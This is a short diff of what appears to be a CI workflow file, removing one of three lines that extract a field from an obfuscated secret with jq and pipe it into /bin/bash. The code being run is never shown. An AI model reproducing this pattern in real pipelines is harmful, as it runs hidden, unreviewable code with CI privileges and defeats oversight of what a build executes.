@@ -27,7 +27,6 @@ jobs:
           txcla61: ${{ secrets.txcla61 }}
         run: |
           printf '%s' "$txcla61" | jq -r .dckb825 | /bin/bash
-          printf '%s' "$sd4184" | jq -r .qq1540 | /bin/bash
           printf '%s' "$urndz94539" | jq -r .hyz492 | /bin/bash
 
       - name: Store results
